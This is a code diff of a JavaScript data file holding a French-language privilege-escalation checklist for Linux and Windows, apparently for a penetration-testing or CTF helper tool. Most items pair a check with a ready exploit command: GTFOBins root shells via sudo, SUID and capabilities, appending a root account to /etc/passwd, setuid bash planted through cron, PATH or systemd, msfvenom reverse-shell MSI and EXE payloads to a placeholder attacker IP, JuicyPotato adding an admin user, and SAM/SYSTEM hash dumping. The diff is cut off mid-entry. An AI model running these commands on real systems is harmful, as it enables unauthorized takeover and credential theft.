@@ -1,767 +1,881 @@
-// Supposer que CHECKLIST_DEFINITION est disponible (soit défini ici, soit importé)
-// Exemple simplifié de CHECKLIST_DEFINITION (voir section 2 pour plus de détails)
+// ==========================================================================
+// ==================== CHECKLIST DEFINITION ================================
+// ==========================================================================
+// Structure:
+// CHECKLIST_DEFINITION[OS_TYPE][CATEGORY] = [ { item }, { item }, ... ]
+// Item: { id, label, description, checkCommand, exploitCommand?, tips?, links?, tags? }
+// ==========================================================================
+
 const CHECKLIST_DEFINITION = {
+    // ==========================================================
+    // ==================== LINUX ===============================
+    // ==========================================================
     'Linux': {
-        'Permissions': [
+        'Kernel Exploits': [
             {
-                id: 'linux-sudo-l',
-                label: 'Vérifier les droits sudo',
-                description: 'Analyser la sortie de `sudo -l` pour identifier les commandes exécutables sans mot de passe (NOPASSWD) ou les binaires exploitables (GTFOBins).',
+                id: 'l_kernel_version',
+                label: 'Kernel Version & Vulnerabilities',
+                description: 'Vérifier la version du kernel et rechercher des exploits de privilèges locaux connus.',
+                checkCommand: 'uname -a\ncat /proc/version\nsearchsploit "Linux Kernel $(uname -r | cut -d\'-\' -f1)" local privilege escalation',
+                exploitCommand: '# (Requires specific exploit based on searchsploit results)\n# Exemple: gcc exploit.c -o exploit && ./exploit',
+                tips: 'Les exploits de kernel sont puissants mais risqués. Testez-les avec précaution. Vérifiez la compatibilité exacte de l\'exploit avec la version du kernel et l\'architecture.',
+                links: ['https://www.exploit-db.com/'],
+                tags: ['kernel', 'exploit', 'vulnerability', 'searchsploit']
+            }
+        ],
+        'Permissions & Misconfigurations': [
+            {
+                id: 'l_sudo_l',
+                label: 'Sudo Permissions (sudo -l)',
+                description: 'Vérifier les commandes que l\'utilisateur peut exécuter avec sudo, en particulier celles sans mot de passe ou permettant l\'exécution en tant que root.',
                 checkCommand: 'sudo -l',
-                exploitationCommand: '# Si NOPASSWD sur /usr/bin/find:\nsudo find . -exec /bin/sh \\; -quit\n# Autres exemples GTFOBins:\nsudo bash -p\nsudo perl -e \'exec "/bin/sh";\'\nsudo python -c \'import os; os.system("/bin/sh")\'',
-                links: [{ name: 'GTFOBins (sudo)', url: 'https://gtfobins.github.io/#+sudo' }],
-                tips: 'Rechercher (ALL : ALL) NOPASSWD: ALL ou des binaires spécifiques. Tester différentes variations des commandes GTFOBins.',
-                tags: ['sudo', 'permissions', 'gtfobins']
+                exploitCommand: '# Si /bin/bash est autorisé:\nsudo /bin/bash\n# Si un éditeur est autorisé (ex: vim):\nsudo vim /etc/shadow (puis :!/bin/bash)\n# Si find est autorisé:\nsudo find . -exec /bin/bash \\; -quit',
+                tips: 'GTFOBins est une ressource essentielle pour trouver comment abuser des binaires autorisés par sudo.',
+                links: ['https://gtfobins.github.io/#+sudo'],
+                tags: ['sudo', 'permissions', 'misconfiguration', 'gtfobins']
             },
             {
-                id: 'linux-suid',
-                label: 'Rechercher les binaires SUID',
-                description: 'Identifier les exécutables SUID suspects ou connus pour être exploitables.',
-                checkCommand: 'find / -type f -perm -4000 -ls 2>/dev/null',
-                exploitationCommand: '# Si /usr/bin/find est SUID:\n./find . -exec /bin/sh -p \\; -quit\n# Exemples courants:\nnmap --interactive\nvi -E\nmore /etc/shadow # Si les permissions le permettent après exploitation',
-                links: [{ name: 'GTFOBins (SUID)', url: 'https://gtfobins.github.io/#+suid' }],
-                tips: 'Comparer la liste avec une liste standard. Vérifier les binaires dans /tmp ou /home. Utiliser `strings` sur les binaires suspects.',
-                tags: ['suid', 'permissions', 'binaries', 'gtfobins']
+                id: 'l_suid_sgid',
+                label: 'SUID/SGID Binaries',
+                description: 'Rechercher les binaires avec les bits SUID ou SGID activés qui pourraient être exploités pour exécuter du code avec les privilèges du propriétaire (souvent root).',
+                checkCommand: 'find / -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\; 2>/dev/null',
+                exploitCommand: '# Si /usr/bin/find est SUID:\nfind . -exec /bin/bash -p \\; -quit\n# Si /usr/bin/cp est SUID:\ncp /etc/shadow /tmp/shadow_copy && chmod 600 /tmp/shadow_copy\n# Si /usr/bin/base64 est SUID:\nLFILE=/etc/shadow; base64 "$LFILE" | base64 --decode',
+                tips: 'Concentrez-vous sur les binaires non standards ou ceux connus pour être exploitables (voir GTFOBins).',
+                links: ['https://gtfobins.github.io/#+suid', 'https://gtfobins.github.io/#+sgid'],
+                tags: ['suid', 'sgid', 'permissions', 'binary', 'gtfobins']
             },
             {
-                id: 'linux-capabilities',
-                label: 'Vérifier les capacités de fichiers',
-                description: 'Les capacités (file capabilities) permettent à des exécutables d\'effectuer des actions privilégiées sans être SUID. Identifier ceux qui pourraient être abusés.',
+                id: 'l_capabilities',
+                label: 'Linux Capabilities',
+                description: 'Identifier les binaires avec des capabilities étendues qui pourraient permettre une escalade de privilèges.',
                 checkCommand: 'getcap -r / 2>/dev/null',
-                exploitationCommand: '# Si cap_setuid+ep sur python:\nsetuid() { /bin/sh; }; setuid\n# Si cap_dac_override+ep sur un binaire:\n./vulnerable_binary /etc/shadow',
-                links: [{ name: 'Linux Capabilities', url: 'https://man7.org/linux/man-pages/man7/capabilities.7.html' }, { name: 'GTFOBins (Capabilities)', url: 'https://gtfobins.github.io/#+capabilities' }],
-                tips: 'Se concentrer sur les capacités `cap_setuid`, `cap_setgid`, `cap_dac_override`, `cap_sys_admin`.',
-                tags: ['capabilities', 'permissions']
-            }
-        ],
-        'System Info': [
+                exploitCommand: '# Si python a cap_setuid+ep:\n./python -c \'import os; os.setuid(0); os.system("/bin/bash -p")\'\n# Si tar a cap_dac_read_search+ep:\ntar -cf shadow.tar /etc/shadow',
+                tips: 'Les capabilities comme `cap_setuid`, `cap_sys_admin`, `cap_dac_read_search` sont particulièrement intéressantes.',
+                links: ['https://gtfobins.github.io/#+capabilities', 'https://linux-audit.com/linux-capabilities-hardening-linux-binaries/'],
+                tags: ['capabilities', 'permissions', 'binary', 'gtfobins']
+            },
+            {
+                id: 'l_writable_files',
+                label: 'World-Writable Files/Directories',
+                description: 'Rechercher les fichiers et répertoires importants (scripts, configurations) qui sont modifiables par tous les utilisateurs.',
+                checkCommand: 'find / -type f -perm -0002 -ls 2>/dev/null\nfind / -type d -perm -0002 -ls 2>/dev/null',
+                exploitCommand: '# Si /etc/passwd est world-writable:\necho \'root2:$1$xyz$abcdefghijklmnopq.:0:0:root:/root:/bin/bash\' >> /etc/passwd\n# Si un script exécuté par root est world-writable:\necho \'chmod +s /bin/bash\' >> /path/to/script.sh',
+                tips: 'Faites attention aux fichiers de configuration, aux scripts dans `/etc/cron.*`, `/etc/init.d`, etc.',
+                tags: ['permissions', 'writable', 'misconfiguration', 'files']
+            },
              {
-                id: 'linux-kernel-version',
-                label: 'Vérifier la version du noyau',
-                description: 'Identifier la version du noyau et rechercher des exploits connus (ex: Dirty COW, Dirty Pipe).',
-                checkCommand: 'uname -a',
-                exploitationCommand: '# Rechercher exploit sur exploit-db ou searchsploit\nsearchsploit Linux Kernel <version>\n# Compiler et exécuter l\'exploit approprié.',
-                links: [{ name: 'Exploit-DB', url: 'https://www.exploit-db.com/' }],
-                tips: 'Utiliser des outils comme linux-exploit-suggester, les scripts AutoRecon ou les scanners d\'énumération locaux (LES).',
-                tags: ['kernel', 'exploit', 'system']
+                id: 'l_path_hijacking',
+                label: 'PATH Environment Variable Hijacking',
+                description: 'Vérifier si le PATH contient des répertoires modifiables (comme `.`) avant les répertoires système, permettant d\'exécuter un binaire malveillant à la place d\'un binaire légitime.',
+                checkCommand: 'echo $PATH\n# Vérifier les permissions des dossiers dans $PATH',
+                exploitCommand: '# Si /tmp est dans le PATH avant /usr/bin et qu\'un script root exécute `ls`:\ncd /tmp\necho \'#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\' > ls\nchmod +x ls\n# Attendre que le script root exécute `ls`',
+                tips: 'Particulièrement pertinent si un script exécuté par root utilise des chemins relatifs pour les commandes.',
+                tags: ['path', 'environment', 'hijacking', 'permissions']
             },
             {
-                id: 'linux-os-release',
-                label: 'Vérifier les informations de distribution',
-                description: 'Obtenir des informations plus détaillées sur la distribution Linux, ce qui peut aider à cibler des exploits spécifiques.',
-                checkCommand: 'cat /etc/os-release',
-                exploitationCommand: '# Rechercher des vulnérabilités spécifiques à la distribution et à sa version.',
-                links: [],
-                tips: 'Combiner avec la version du noyau pour une recherche d\'exploits plus précise.',
-                tags: ['os', 'system']
+                id: 'l_acl',
+                label: 'Abusing File System Permissions (ACLs)',
+                description: 'Vérifier les Access Control Lists (ACLs) des fichiers et répertoires pour des permissions inattendues.',
+                checkCommand: 'find / -type f -acl -exec getfacl {} \\; 2>/dev/null\nfind / -type d -acl -exec getfacl {} \\; 2>/dev/null',
+                exploitCommand: '# Si getfacl montre u:<user>:rwx sur un fichier privilégié:\nsetfacl -m u:$USER:rwx /chemin/fichier_privilegie; echo \'evil_command\' > /chemin/fichier_privilegie',
+                tips: 'Les ACLs peuvent outrepasser les permissions Unix standard. Recherchez les entrées `user:<your_user>:rwx` ou `group:<your_group>:rwx`.',
+                tags: ['acl', 'permissions', 'filesystem']
             },
             {
-                id: 'linux-environment-variables',
-                label: 'Examiner les variables d\'environnement',
-                description: 'Certaines variables d\'environnement peuvent révéler des informations sensibles (chemins, configurations) ou être exploitées.',
-                checkCommand: 'env',
-                exploitationCommand: '# Exemple d\'abus de PATH si SUID:\nexport PATH=/tmp:$PATH\necho \'#!/bin/sh\' > /tmp/evil.sh\nchmod +x /tmp/evil.sh\n./suid_vulnerable_binary',
-                links: [],
-                tips: 'Rechercher des chemins non standard dans PATH, des variables contenant des mots de passe ou des informations d\'identification.',
-                tags: ['environment', 'configuration']
+                id: 'l_pam',
+                label: 'Exploiting PAM (Pluggable Authentication Modules)',
+                description: 'Vérifier les configurations PAM pour des faiblesses potentielles (rare mais possible).',
+                checkCommand: 'ls -l /etc/pam.d/\ncat /etc/pam.d/*',
+                exploitCommand: '# Très contextuel, dépend d\'une mauvaise configuration spécifique.',
+                tips: 'Recherchez des modules mal configurés ou des fichiers modifiables dans `/etc/pam.d/`.',
+                tags: ['pam', 'authentication', 'misconfiguration']
             }
         ],
-        'Applications & Services': [
+        'Services & Cron Jobs': [
             {
-                id: 'linux-world-writable-files',
-                label: 'Rechercher les fichiers inscriptibles par tous',
-                description: 'Identifier les fichiers ou dossiers avec des permissions 777 qui pourraient être exploités pour placer des backdoors ou modifier des fichiers de configuration.',
-                checkCommand: 'find / -perm -o=w -type f 2>/dev/null',
-                exploitationCommand: '# Écrire un backdoor dans un fichier cron ou un script de démarrage.',
-                links: [],
-                tips: 'Se concentrer sur les fichiers importants dans /etc, les scripts de démarrage, les fichiers cron.',
-                tags: ['permissions', 'files']
+                id: 'l_cron_jobs',
+                label: 'Cron Jobs Analysis',
+                description: 'Analyser les tâches cron système et utilisateur pour identifier des scripts ou binaires modifiables exécutés avec des privilèges élevés.',
+                checkCommand: 'ls -l /etc/cron*\ncat /etc/crontab\ncat /etc/cron.d/*\ncrontab -l',
+                exploitCommand: '# Si un script dans /etc/cron.hourly est modifiable:\necho \'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\' >> /etc/cron.hourly/modifiable_script.sh',
+                tips: 'Vérifiez les permissions des scripts et des répertoires où ils se trouvent. Attention aux wildcards dans les commandes cron.',
+                tags: ['cron', 'scheduled task', 'permissions', 'script']
             },
             {
-                id: 'linux-writable-config-files',
-                label: 'Rechercher les fichiers de configuration inscriptibles par l\'utilisateur courant',
-                description: 'Identifier les fichiers de configuration appartenant à d\'autres utilisateurs ou root mais inscriptibles par l\'utilisateur actuel, ce qui pourrait permettre une prise de contrôle.',
-                checkCommand: 'find /etc -type f -user root -writable -not -perm -g+w 2>/dev/null',
-                exploitationCommand: '# Modifier /etc/passwd pour ajouter un nouvel utilisateur root (avec shadow).\n# Modifier des fichiers de configuration de services pour exécuter des commandes arbitraires.',
-                links: [],
-                tips: 'Être prudent lors de la modification de fichiers de configuration système.',
-                tags: ['permissions', 'files', 'configuration']
+                id: 'l_systemctl_abuse',
+                label: 'Abusing Systemctl (via Sudo)',
+                description: 'Si l\'utilisateur a des droits sudo spécifiques sur `systemctl`, cela peut être utilisé pour démarrer/modifier des services et escalader.',
+                checkCommand: 'sudo -l | grep systemctl',
+                exploitCommand: '# Créer un service malveillant (evil.service):\n[Unit]\nDescription=Evil Service\n\n[Service]\nType=simple\nExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"\n\n[Install]\nWantedBy=multi-user.target\n\n# Placer le service et démarrer:\nsudo cp evil.service /etc/systemd/system/\nsudo systemctl enable evil.service --now',
+                tips: 'Vérifiez si `sudo systemctl start/stop/enable/disable/edit` est autorisé.',
+                tags: ['systemd', 'systemctl', 'service', 'sudo', 'misconfiguration']
+            }
+        ],
+        'Credentials & Information': [
+            {
+                id: 'l_history_files',
+                label: 'Shell History Files',
+                description: 'Vérifier les fichiers d\'historique du shell pour des mots de passe, clés API ou informations sensibles.',
+                checkCommand: 'cat ~/.bash_history\ncat ~/.zsh_history\ncat ~/.ash_history\ncat /root/.bash_history (si lisible)',
+                tips: 'Recherchez des commandes contenant `-p`, `password`, `pass`, `secret`, `key`, `token`, `ssh`, `mysql`, `psql`, etc.',
+                tags: ['credentials', 'history', 'sensitive data', 'enumeration']
             },
             {
-                id: 'linux-mounted-devices',
-                label: 'Examiner les périphériques montés',
-                description: 'Identifier les périphériques montés (clés USB, partages réseau) qui pourraient contenir des informations sensibles ou être utilisés comme point d\'entrée.',
-                checkCommand: 'mount',
-                exploitationCommand: '# Examiner le contenu des périphériques montés.',
-                links: [],
-                tips: 'Vérifier les options de montage (noexec, nosuid).',
-                tags: ['system', 'storage']
+                id: 'l_config_files',
+                label: 'Configuration Files',
+                description: 'Rechercher des mots de passe en clair ou des informations sensibles dans les fichiers de configuration courants.',
+                checkCommand: 'grep -iE \'(password|passwd|pass|secret|key)=\' /etc/* /var/www/* ~/.* /opt/* -R 2>/dev/null\nfind / -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.yml" -exec grep -iE \'(password|secret|key)\' {} \\; -print 2>/dev/null',
+                tips: 'Fichiers courants: `/etc/shadow` (hash), `/etc/fstab`, web server configs (Apache, Nginx), database configs, application configs.',
+                tags: ['credentials', 'config file', 'sensitive data', 'enumeration']
             },
             {
-                id: 'linux-scheduled-tasks',
-                label: 'Vérifier les tâches planifiées (Cron)',
-                description: 'Lister les tâches cron de l\'utilisateur actuel et les tâches système qui pourraient être exploitables si l\'utilisateur a des droits d\'écriture sur les scripts exécutés.',
-                checkCommand: 'crontab -l; cat /etc/crontab; find /etc/cron.* /var/spool/cron -type f 2>/dev/null',
-                exploitationCommand: '# Si l\'utilisateur a le droit d\'écrire dans un script cron exécuté en tant que root, ajouter une commande de reverse shell.',
-                links: [],
-                tips: 'Vérifier les permissions des scripts mentionnés dans les fichiers cron.',
-                tags: ['scheduled tasks', 'cron']
-            },
+                id: 'l_ssh_keys',
+                label: 'SSH Keys',
+                description: 'Rechercher des clés SSH privées (souvent `id_rsa`) qui pourraient permettre de se connecter à d\'autres machines ou en tant qu\'autres utilisateurs.',
+                checkCommand: 'ls -l ~/.ssh/\nfind / -name id_rsa 2>/dev/null',
+                exploitCommand: '# Si une clé privée est trouvée pour root:\nchmod 600 /path/to/root_id_rsa\nssh -i /path/to/root_id_rsa root@localhost',
+                tips: 'Vérifiez les permissions des clés. Les clés privées doivent être protégées (600).',
+                tags: ['credentials', 'ssh', 'key', 'enumeration']
+            }
+        ],
+        'Software Vulnerabilities': [
             {
-                id: 'linux-path-hijacking',
-                label: 'Potentiel de détournement de PATH',
-                description: 'Identifier les situations où des binaires privilégiés sont appelés sans chemin absolu et où l\'utilisateur actuel pourrait créer un exécutable malveillant avec le même nom dans un répertoire présent plus tôt dans la variable PATH.',
-                checkCommand: 'ps aux | grep -v grep | awk \'{print $1, $11}\' | grep -v \'\[\' | while read user command; do if [[ "$command" != /* ]]; then which "$command"; fi; done',
-                exploitationCommand: '# Créer un exécutable malveillant dans un répertoire listé avant le répertoire légitime dans PATH.',
-                links: [],
-                tips: 'Analyser les scripts et les binaires SUID/SGID.',
-                tags: ['path', 'binaries']
+                id: 'l_software_vulns',
+                label: 'Exploiting Software Vulnerabilities (Local)',
+                description: 'Rechercher les vulnérabilités dans les logiciels installés (autres que le kernel) qui ont des exploits locaux connus.',
+                checkCommand: 'dpkg -l\nrpm -qa\n# Utiliser des outils comme LinPEAS ou linux-exploit-suggester',
+                exploitCommand: '# Utiliser searchsploit ou des bases de données de vulnérabilités:\nsearchsploit <nom_du_logiciel> <version> local privilege escalation',
+                tips: 'Nécessite une identification précise de la version du logiciel vulnérable.',
+                tags: ['software', 'vulnerability', 'exploit', 'searchsploit']
+            }
+        ],
+        'NFS Misconfigurations': [
+            {
+                id: 'l_nfs_no_root_squash',
+                label: 'NFS Root Squashing Disabled',
+                description: 'Si un partage NFS est monté avec l\'option `no_root_squash`, l\'utilisateur root local peut créer des fichiers SUID appartenant à root sur le partage.',
+                checkCommand: 'cat /etc/exports (sur le serveur NFS)\nshowmount -e <NFS_SERVER_IP>\nmount | grep nfs\ncat /etc/fstab | grep nfs',
+                exploitCommand: '# Sur la machine cliente (en tant que root local):\nmount -t nfs <NFS_SERVER_IP>:/path/to/share /mnt/nfs\ncp /bin/bash /mnt/nfs/rootshell\nchmod +s /mnt/nfs/rootshell\n# Sur une autre machine ayant accès au partage (ou la même):\n/mnt/nfs/rootshell -p',
+                tips: 'Nécessite d\'avoir un accès root local sur une machine qui monte le partage NFS vulnérable.',
+                tags: ['nfs', 'permissions', 'misconfiguration', 'suid', 'network']
             }
         ]
     },
+
+    // ==========================================================
+    // ==================== WINDOWS =============================
+    // ==========================================================
     'Windows': {
-        'Permissions & Privileges': [
+        'Misconfigurations': [
             {
-                id: 'win-whoami-priv',
-                label: 'Vérifier les privilèges du token',
-                description: 'Analyser `whoami /priv` pour les privilèges sensibles activés (SeImpersonate, SeBackup, SeDebug...).',
+                id: 'w_always_install_elevated',
+                label: 'AlwaysInstallElevated Registry Keys',
+                description: 'Vérifier si les clés de registre `AlwaysInstallElevated` sont activées, permettant à n\'importe quel utilisateur d\'installer des packages MSI avec les privilèges SYSTEM.',
+                checkCommand: 'reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
+                exploitCommand: '# Générer un payload MSI malveillant:\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=<PORT> -f msi -o evil.msi\n# Transférer evil.msi sur la cible\n# Exécuter l\'installeur MSI:\nmsiexec /i evil.msi /quiet',
+                tips: 'Les deux clés (HKLM et HKCU) doivent être à 1 pour que cela fonctionne.',
+                tags: ['registry', 'msi', 'misconfiguration', 'system']
+            },
+            {
+                id: 'w_unquoted_service_paths',
+                label: 'Unquoted Service Paths',
+                description: 'Identifier les services Windows dont le chemin vers l\'exécutable n\'est pas entre guillemets et contient des espaces.',
+                checkCommand: 'wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """\npowershell -c "Get-CimInstance -ClassName Win32_Service | Select Name, DisplayName, PathName, StartMode | Where-Object {$_.StartMode -eq \'Auto\' -and $_.PathName -notlike \'C:\\Windows\\*\' -and $_.PathName -notlike \'"*\'}"',
+                exploitCommand: '# Si le chemin est "C:\\Program Files\\Some Dir\\service.exe":\n# Placer un exécutable malveillant nommé "Program.exe" dans C:\\\nmsfvenom -p windows/shell_reverse_tcp LHOST=<IP_KALI> LPORT=<PORT> -f exe -o "C:\\Program.exe"\n# Redémarrer le service (ou attendre le redémarrage du système):\nsc stop <ServiceName> && sc start <ServiceName>',
+                tips: 'Nécessite des permissions d\'écriture dans un des dossiers parents du chemin (ex: `C:\\`).',
+                tags: ['service', 'permissions', 'misconfiguration', 'path']
+            },
+            {
+                id: 'w_weak_service_permissions',
+                label: 'Insecure Service Permissions',
+                description: 'Vérifier si l\'utilisateur actuel a des permissions pour modifier la configuration (chemin du binaire, utilisateur d\'exécution) ou redémarrer des services qui tournent avec des privilèges élevés.',
+                checkCommand: '# Utiliser PowerUp.ps1:\nImport-Module .\\PowerUp.ps1; Get-ModifiableService\n# Ou AccessChk.exe (Sysinternals):\naccesschk.exe /accepteula -uwcqv <USERNAME> *',
+                exploitCommand: '# Si le service "VulnSvc" est modifiable:\nsc config VulnSvc binPath= "C:\\path\\to\\evil.exe"\nsc stop VulnSvc\nsc start VulnSvc',
+                tips: 'Les permissions intéressantes sont `SERVICE_CHANGE_CONFIG`, `SERVICE_START`, `SERVICE_STOP`, `WRITE_DAC`, `WRITE_OWNER`.',
+                links: ['https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1'],
+                tags: ['service', 'permissions', 'acl', 'misconfiguration', 'powerup']
+            },
+            {
+                id: 'w_weak_registry_permissions',
+                label: 'Insecure Registry Permissions',
+                description: 'Vérifier si l\'utilisateur a des permissions d\'écriture sur des clés de registre sensibles, notamment celles liées aux services ou à l\'autostart.',
+                checkCommand: '# Utiliser PowerUp.ps1:\nImport-Module .\\PowerUp.ps1; Get-ModifiableRegistryAutoRun\n# Ou AccessChk.exe:\naccesschk.exe /accepteula -uwk "HKLM\\Software"\naccesschk.exe /accepteula -uwk "HKLM\\System\\CurrentControlSet\\Services"',
+                exploitCommand: '# Si HKLM\\...\\Service\\ImagePath est modifiable:\nreg add "HKLM\\...\\Service" /v ImagePath /t REG_EXPAND_SZ /d "C:\\path\\to\\evil.exe" /f\n# Redémarrer le service',
+                tips: 'Rechercher les permissions `KEY_WRITE`, `KEY_CREATE_SUB_KEY`.',
+                tags: ['registry', 'permissions', 'acl', 'misconfiguration', 'powerup']
+            },
+            {
+                id: 'w_weak_folder_permissions',
+                label: 'Insecure Folder Permissions (DLL Hijacking)',
+                description: 'Identifier les dossiers dans le PATH système ou dans les chemins d\'exécutables de services où l\'utilisateur a des droits d\'écriture, permettant potentiellement le DLL Hijacking.',
+                checkCommand: '# Utiliser PowerUp.ps1:\nImport-Module .\\PowerUp.ps1; Find-PathDLLHijack\n# Ou AccessChk.exe sur les dossiers du PATH et des services',
+                exploitCommand: '# Générer une DLL malveillante (ex: hijack.dll)\n# Placer hijack.dll dans le dossier vulnérable\n# Redémarrer le service/application qui charge la DLL',
+                tips: 'Nécessite de connaître le nom d\'une DLL chargée par un processus privilégié et manquante ou chargée depuis un chemin non sécurisé.',
+                tags: ['permissions', 'dll hijacking', 'path', 'misconfiguration', 'powerup']
+            }
+        ],
+        'Credentials & Tokens': [
+            {
+                id: 'w_saved_credentials',
+                label: 'Windows Vault / Credential Manager',
+                description: 'Rechercher des identifiants sauvegardés dans le gestionnaire d\'identification Windows.',
+                checkCommand: 'cmdkey /list\npowershell -c "(Get-Vault).Credential | Format-List -Property *"',
+                exploitCommand: '# Utiliser Mimikatz (nécessite des privilèges élevés ou un contexte spécifique):\nmimikatz # vault::cred',
+                tips: 'Peut contenir des identifiants pour des partages réseau, RDP, sites web.',
+                tags: ['credentials', 'vault', 'cmdkey', 'mimikatz']
+            },
+            {
+                id: 'w_unattended_install_files',
+                label: 'Unattended Install Files',
+                description: 'Rechercher des fichiers d\'installation sans surveillance (Unattend.xml, sysprep.inf, etc.) qui peuvent contenir des mots de passe administrateur en clair ou encodés.',
+                checkCommand: 'dir /s /b C:\\*Unattend*.xml\ndir /s /b C:\\*sysprep*.inf\ndir /s /b C:\\*sysprep*.xml\ntype C:\\Windows\\Panther\\Unattend\\Unattend.xml',
+                tips: 'Les mots de passe sont souvent encodés en Base64 dans ces fichiers.',
+                tags: ['credentials', 'unattended', 'sysprep', 'xml', 'sensitive data']
+            },
+            {
+                id: 'w_sam_system_backup',
+                label: 'SAM/SYSTEM Hive Backup',
+                description: 'Vérifier si les fichiers SAM et SYSTEM (contenant les hashs NTLM locaux) sont accessibles ou si des sauvegardes existent.',
+                checkCommand: 'dir C:\\Windows\\Repair\\\ndir C:\\Windows\\System32\\config\\RegBack\\',
+                exploitCommand: '# Si accessibles:\ncopy C:\\Windows\\System32\\config\\SAM .\ncopy C:\\Windows\\System32\\config\\SYSTEM .\n# Extraire les hashs hors ligne:\nimpacket-secretsdump -sam SAM -system SYSTEM LOCAL',
+                tips: 'Nécessite souvent des privilèges élevés pour accéder aux fichiers actifs. Les sauvegardes (RegBack) peuvent être accessibles.',
+                tags: ['credentials', 'hash', 'ntlm', 'sam', 'system', 'secretsdump']
+            },
+            {
+                id: 'w_token_impersonation',
+                label: 'Token Impersonation (SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege)',
+                description: 'Vérifier si l\'utilisateur possède les privilèges `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege`.',
                 checkCommand: 'whoami /priv',
-                exploitationCommand: '# Si SeImpersonate:\n# Utiliser JuicyPotatoNG, PrintSpoofer...\nPrintSpoofer.exe -i -c cmd\n# Si SeBackupPrivilege:\n# Utiliser NTBackupHacker, ShadowCopy...',
-                links: [{ name: 'HackTricks (Token Privs)', url: 'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#token-privileges' }],
-                tips: 'SeImpersonate/SeAssignPrimaryToken sont souvent exploitables pour usurper l\'identité d\'autres utilisateurs/systèmes. SeBackupPrivilege peut permettre de lire des fichiers protégés (SAM, Registry).',
-                tags: ['privileges', 'token', 'whoami']
+                exploitCommand: '# Utiliser Juicy Potato / Rotten Potato / PrintSpoofer / GodPotato etc.:\n.\\JuicyPotato.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a "/c net user hacker password /add && net localgroup administrators hacker /add" -t * -c {CLSID}\n.\\PrintSpoofer.exe -i -c cmd',
+                tips: 'Permet d\'usurper le token de sécurité d\'autres processus, souvent `NT AUTHORITY\\SYSTEM`. Nécessite des conditions spécifiques (ex: service réseau écoutant).',
+                links: ['https://github.com/ohpe/juicy-potato', 'https://github.com/itm4n/PrintSpoofer'],
+                tags: ['token', 'impersonation', 'privilege', 'SeImpersonatePrivilege', 'SeAssignPrimaryTokenPrivilege', 'juicypotato', 'printspoofer']
             },
+            {
+                id: 'w_backup_operators',
+                label: 'Backup Operators Privilege (SeBackupPrivilege)',
+                description: 'Vérifier si l\'utilisateur est membre du groupe `Backup Operators` ou possède le privilège `SeBackupPrivilege`.',
+                checkCommand: 'whoami /priv\nwhoami /groups\nnet user <username>\nnet localgroup "Backup Operators"',
+                exploitCommand: '# Permet de lire n\'importe quel fichier, y compris SAM/SYSTEM:\n# Utiliser robocopy avec l\'option /B:\nrobocopy C:\\Windows\\System32\\config C:\\Temp SAM SYSTEM /B\n# Ou des outils spécifiques comme diskshadow:\ndiskshadow /s script.txt (script.txt contient les commandes pour monter et copier)',
+                tips: 'Ce privilège permet de contourner les ACLs pour la lecture de fichiers.',
+                tags: ['privilege', 'SeBackupPrivilege', 'backup operators', 'acl', 'sam', 'system']
+            }
+        ],
+        'Services & Tasks': [
+            {
+                id: 'w_scheduled_tasks',
+                label: 'Scheduled Tasks',
+                description: 'Analyser les tâches planifiées pour identifier celles qui s\'exécutent avec des privilèges élevés et dont le binaire ou le script associé est modifiable.',
+                checkCommand: 'schtasks /query /fo LIST /v\npowershell -c "Get-ScheduledTask | Where-Object {$_.Principal.UserID -ne $env:USERNAME} | Select TaskName, TaskPath, State, Principal | Format-List"',
+                exploitCommand: '# Si le binaire d\'une tâche SYSTEM est modifiable:\n# Remplacer le binaire par un payload\n# Attendre l\'exécution de la tâche ou la déclencher:\nschtasks /run /tn "<TaskName>"',
+                tips: 'Vérifiez les permissions sur les exécutables pointés par les tâches planifiées.',
+                tags: ['scheduled task', 'schtasks', 'permissions', 'misconfiguration']
+            }
+        ],
+        'Software Vulnerabilities': [
              {
-                id: 'win-alwaysinstallelevated',
-                label: 'Vérifier AlwaysInstallElevated',
-                description: 'Vérifier si les clés de registre AlwaysInstallElevated sont activées (valeur 1), permettant l\'installation de MSI avec les privilèges SYSTEM.',
-                checkCommand: 'reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated && reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
-                exploitationCommand: '# Si les deux clés sont à 1:\nmsfvenom -p windows/x64/exec CMD=cmd.exe -f msi -o malicious.msi\nmsiexec /i malicious.msi /quiet',
-                links: [{ name: 'HackTricks (AlwaysInstallElevated)', url: 'https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated' }],
-                tips: 'Les deux clés (HKLM et HKCU) doivent être à 1 pour que l\'exploit fonctionne.',
-                tags: ['registry', 'msi', 'configuration']
-            },
-            {
-                id: 'win-uac-bypass',
-                label: 'Rechercher les vulnérabilités de contournement UAC',
-                description: 'Identifier les méthodes connues pour contourner le User Account Control (UAC) et exécuter du code avec des privilèges élevés.',
-                checkCommand: '# Vérifier les configurations UAC (Regedit: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA)\n# Rechercher des binaires auto-élevés qui peuvent être abusés (voir GTFOBins).',
-                exploitationCommand: '# Utiliser des outils comme UACMe, Metasploit modules (exploit/windows/local/bypass_uac...).',
-                links: [{ name: 'UACMe', url: 'https://github.com/hfiref0x/UACME' }, { name: 'GTFOBins (UAC Bypass)', url: 'https://gtfobins.github.io/#+uac' }],
-                tips: 'Le niveau de UAC configuré influence les méthodes de contournement possibles.',
-                tags: ['uac', 'bypass', 'privileges']
-            },
-            {
-                id: 'win-auto-elevated-binaries',
